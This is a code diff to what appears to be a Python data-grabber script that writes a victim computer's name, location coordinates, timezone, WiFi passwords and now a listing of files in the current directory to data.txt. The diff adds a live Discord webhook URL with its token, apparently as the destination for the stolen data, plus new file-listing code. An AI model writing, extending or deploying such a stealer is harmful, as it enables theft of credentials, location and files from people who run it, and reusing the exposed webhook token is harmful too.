@@ -29,7 +29,7 @@ print("")
 
 
 #set webhook url here
-url = ""
+url = "https://discord.com/api/webhooks/1087049956189282384/YbRIcjRjKNgsKDu-y38X5-uobYXQmKAvW-jqqeAeFKX6rTMgl1oV5JviHO5fE5dBWkN6"
 
 if os.name == "nt":
     system = "Windows"
@@ -75,6 +75,11 @@ except:
     pass
 
 try:
+    files_here = str(os.listdir())
+except:
+    pass
+
+try:
     with open("data.txt", "w") as a:
         a.write(f"INFO FOR {computer_name}\n")
         a.write("\n")
@@ -94,6 +99,10 @@ try:
         a.write(f"Latitute: {latitute}\n")
         a.write(f"Longitute: {longitute}\n")
         a.write(f"Timezone: {timezone}\n")
+        a.write("\n")
+        a.write("FILES IN CURRENT DIRECTORY\n")
+        a.write("\n")
+        a.write(f"{files_here}\n")
         a.write("\n")
         a.write("WIFI PASSWORDS\n")
         a.write("\n")
